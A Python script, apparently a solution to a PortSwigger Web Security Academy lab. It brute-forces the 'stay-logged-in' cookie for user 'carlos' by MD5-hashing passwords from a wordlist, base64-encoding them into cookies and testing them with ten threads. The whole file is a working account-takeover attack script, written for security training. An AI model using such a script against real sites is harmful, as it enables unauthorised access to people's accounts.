import queue
import hashlib
import time
import base64
import requests
import threading

server_name = "0adf000b049bccd7803e3f4d002200de"

url = f"https://{server_name}.web-security-academy.net/my-account?id=carlos"

headers = {
    "Host": f"{server_name}.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

passwords_queue = queue.Queue()
found = threading.Event()

def md5Encrypt(string):
    return hashlib.md5(string.encode()).hexdigest()

def base64Encoder(string):
    return base64.b64encode(string.encode()).decode()

def bruteForce():
    while not passwords_queue.empty() and not found.is_set():
        password = passwords_queue.get()
        md5_password = md5Encrypt(password)
        data = f"carlos:{md5_password}"
        base64_data = base64Encoder(data)

        headers["Cookie"] = f"stay-logged-in={base64_data}"
        session = requests.session()
        response = session.get(url, headers=headers, allow_redirects=False)
        print(f"[-] Trying: {base64_data}")

        if b"Your username is" in response.content:
            found.set()
            time.sleep(2)
            print(f"\n[*] Found, Cookie: stay-logged-in={base64_data}\n")

def main():
    threads = []
    number_of_threads = 10

    # Put the usernames in a Queue
    with open('../credentials/passwords.txt', 'r') as file:
        for line in file:
            passwords_queue.put(line.strip('\n'))

    for _ in range(number_of_threads):
        t = threading.Thread(target=bruteForce)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()



if __name__ == "__main__":
    main()
